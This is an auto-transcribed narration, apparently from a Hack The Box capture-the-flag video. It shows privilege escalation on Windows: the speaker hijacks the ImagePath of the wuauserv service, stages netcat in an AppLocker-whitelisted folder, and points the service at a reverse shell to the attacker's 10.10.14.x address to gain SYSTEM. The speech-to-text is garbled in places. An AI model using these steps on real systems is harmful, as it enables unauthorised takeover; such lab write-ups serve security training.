dumb permissions on a service so if we go windows system32 i'm just gonna do dot slash SC so you can see this works so we're not doing the CMD /c I think if I just type SC in something it will hang my session so that's why I'm not doing that SC query W a serve and we can see the state is one which is stopped I've been if we just created a bunch of services we could figure out exactly what each state is but oh well so instead of this we want to do what is it it's gonna be SC and then config big wau SEO V and it's either been past that image path I think bin path is equal to test we get access to nide image path is equal to test okay that doesn't work we only have these things so BIM path is this image path is in the registry but we could access denied there if we go back into H key local machine get item 4w a serve image path is here so we can set item W a serve - path oh set item oops - path the you a serve - name image path - value C : back we'll just do please subscribe it cannot be found name set item - Pat W a Windows Update something update that's right I thought it was - name C is a case-sensitive see get item that's there maybe a stash property I'm doing something wrong maybe set item is alias is something I'm not thinking it is so we'll do the full command set item property there we go so set item is probably a command and that's not meant for registry ok and get item W a serve and we can see we have now changed the image path so what we want to do is change the image path to be something we can execute so I'm going to use netcat when doing like powershell IEX stuff in a registry it's just so many bad characters you may not work so we're gonna go into CD windows system32 spool drivers color and this is generally just a window spot where authenticated users can write so I always like dropping binaries here as a benefit if like AppLocker is black listing exe s out of non normal spots generally there's a white list for executing anything under windows system32 and if you write to this directory you can access that white list so it's also a good app Locker bypass directory let's do double you get 10 10 14 - and CT exceed ONC exe and before we do that locate NC exe let's copy out of user share windows resources binaries do dub okay boom let's now grate this 9001 and we'll do NCE xee will probably do dot slash backslash ten ten fourteen to nine thousand one dash e PowerShell and I'm just making sure the netcat I had downloaded had the - 'flag like I don't think which and see actually Kelly now symlinks this neck at that long story short there are multiple versions of netcat and some of them do not have the dash e flag this is linked to end cat so I do guess that was a rabbit hole let's just get through this box so listen on port 9001 and we'll go back up here we have to go into H key local machine so go up and this value is going to be the path of the registry whoops and then NC exe 10 10 14 - 9001 - e PowerShell so let's do get item that you I serve so now we can see what this image path is I think it just truncated I think there's a PowerShell I have no reason to believe there isn't oh it's going to a new line there it is so let's make sure we're listening 9001 netcat is 9001 so start - service wua you seob and there we go do Who am I we are anti Authority system so we go to users administrator desktop and now that hack the box rotates their flags we can now show the flag and not worry about people just copy and pasting it in so I'm doing this because sometimes Windows does EFS the encrypted file system which would make you need the administrators password to read it for what set if you just search it checked out rocks for EFS we go into it but but uhm yeah so that is the Box hope you guys enjoyed take care and I'll see you all next week